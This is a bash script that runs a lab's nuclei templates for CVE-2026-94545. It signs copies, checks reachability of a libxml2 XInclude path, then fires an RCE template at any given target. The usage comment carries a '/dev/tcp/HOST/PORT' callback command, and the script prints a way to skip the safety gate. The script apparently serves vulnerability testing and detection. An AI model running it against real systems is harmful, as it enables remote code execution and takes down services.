#!/usr/bin/env bash
# Run the CVE-2026-94545 templates with the real nuclei binary.
#
# nuclei v3 refuses to execute unsigned `javascript:` templates
# (pkg/catalog/loader/loader.go: IsUnsignedJavascriptTemplate -> skip -> "no
# templates provided for scan"), so the templates have to be signed first.
# Signing uses a machine-local ECDSA keypair under ~/.config/nuclei/keys/, so a
# signed copy is only valid on the machine that signed it - this script signs
# *copies* under .signed/ and leaves the repository files untouched.
#
# Usage:
#   ./run-nuclei.sh                          # lab target http://127.0.0.1:3000
#   ./run-nuclei.sh http://10.0.0.5:3000     # any target
#   ./run-nuclei.sh http://127.0.0.1:3000 --no-rce
#   ./run-nuclei.sh http://127.0.0.1:3000 --oast 127.0.0.1:4444
#   ./run-nuclei.sh http://127.0.0.1:3000 --cmd 'bash -c "id>/dev/tcp/HOST/PORT"'
set -uo pipefail

LAB_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
TEMPLATE_DIR="$(cd "$LAB_DIR/.." && pwd)"
SIGNED_DIR="$LAB_DIR/.signed"

TARGET="http://127.0.0.1:3000"
RUN_RCE=1
CMD=""
OAST=""

while [ $# -gt 0 ]; do
  case "$1" in
    --no-rce) RUN_RCE=0; shift ;;
    --cmd)    CMD="${2:-}"; shift 2 ;;
    --oast)   OAST="${2:-}"; shift 2 ;;
    -h|--help) sed -n '2,22p' "${BASH_SOURCE[0]}" | sed 's/^# \{0,1\}//'; exit 0 ;;
    *) TARGET="$1"; shift ;;
  esac
done

c_red=$'\033[1;31m'; c_green=$'\033[1;32m'; c_dim=$'\033[2m'; c_blue=$'\033[1;34m'; c_off=$'\033[0m'
log()  { printf '%s[nuclei-run]%s %s\n' "$c_blue" "$c_off" "$*"; }
die()  { printf '%s[nuclei-run]%s %s\n' "$c_red" "$c_off" "$*" >&2; exit 1; }

# ---------------------------------------------------------------------- checks
command -v nuclei >/dev/null 2>&1 || die "nuclei not found on PATH"
log "nuclei: $(nuclei -version 2>&1 | grep -oE 'v[0-9]+\.[0-9]+\.[0-9]+' | head -1)"

status="$(curl -s -o /dev/null -m 8 -w '%{http_code}' "$TARGET/api/og?value=nuclei" 2>/dev/null || true)"
[ -n "$status" ] && [ "$status" != "000" ] ||
  die "no HTTP response from $TARGET/api/og (target down? for a container: sudo docker ps && sudo docker start cve-2026-94545)"
log "target $TARGET answers (HTTP $status on /api/og)"

# ----------------------------------------------------------------- sign copies
mkdir -p "$SIGNED_DIR"
for name in CVE-2026-94545.yaml CVE-2026-94545-rce.yaml; do
  cp -f "$TEMPLATE_DIR/$name" "$SIGNED_DIR/$name"
done

log "signing copies in $SIGNED_DIR (on a fresh machine the first call only generates a keypair)"
nuclei -sign -t "$SIGNED_DIR" >/dev/null 2>&1
nuclei -sign -t "$SIGNED_DIR" >/dev/null 2>&1

for name in CVE-2026-94545.yaml CVE-2026-94545-rce.yaml; do
  grep -q '^# digest:' "$SIGNED_DIR/$name" ||
    die "could not sign $name - run 'nuclei -sign -t $SIGNED_DIR' by hand and read its output"
done
log "both templates signed (~/.config/nuclei/keys)"

# ------------------------------------------------------------------- runner
# verdicts come from nuclei's own JSONL output, not from scraping log text
run_template() { # template-file, extra nuclei args...
  local tpl="$1"; shift
  RESULT_FILE="$(mktemp)"
  nuclei -u "$TARGET" -t "$tpl" -jsonl -o "$RESULT_FILE" -silent "$@" 2>&1 | sed 's/^/    /'
  return 0
}

# ------------------------------------------------------------------- detection
log "detection template against $TARGET"
run_template "$SIGNED_DIR/CVE-2026-94545.yaml"
detection_events="$(grep -c '"template-id"' "$RESULT_FILE" 2>/dev/null || true)"
rm -f "$RESULT_FILE"

if [ "${detection_events:-0}" -gt 0 ]; then
  printf '  %sREACHABLE%s - native libxml2 XInclude path is live (%s event(s))\n' "$c_green" "$c_off" "$detection_events"
  verdict=0
else
  printf '  %sNOT REACHABLE%s - escaped text (patched build), resvg-wasm fallback, or no such route\n' "$c_dim" "$c_off"
  verdict=1
fi

# ------------------------------------------------------------------ live fire
if [ "$RUN_RCE" != "1" ]; then
  exit 0
fi

if [ "$verdict" != "0" ]; then
  log "skipping the exploit template - the pre-condition gate would refuse this target anyway"
  log "(to force delivery: nuclei -u $TARGET -t $SIGNED_DIR/CVE-2026-94545-rce.yaml -var safecheck=false)"
  exit 0
fi

log "exploit template against $TARGET"
rce_args=()
[ -n "$CMD" ]  && rce_args+=(-var "cmd=$CMD")
[ -n "$OAST" ] && rce_args+=(-var "oast=$OAST")
if [ -z "$CMD" ] && [ -z "$OAST" ]; then
  log "callback channel: interactsh (the target needs outbound internet)"
fi

run_template "$SIGNED_DIR/CVE-2026-94545-rce.yaml" "${rce_args[@]}"
interactions="$(grep -c '"interactsh_protocol"' "$RESULT_FILE" 2>/dev/null || true)"
rm -f "$RESULT_FILE"

if [ "${interactions:-0}" -gt 0 ]; then
  printf '  %sEXPLOITED%s - %s interaction(s); the worker process was replaced\n' "$c_green" "$c_off" "$interactions"
else
  printf '  %sno callback%s - wrong Node build, sharp missing, or the gate refused\n' "$c_dim" "$c_off"
fi

cat <<EOF

  After a successful chain the target's node process is gone:
    lab:                ./start.sh --restart vulnerable
    podman/docker image: the container exits (node is PID 1 there), restart with
                         sudo docker start cve-2026-94545
EOF
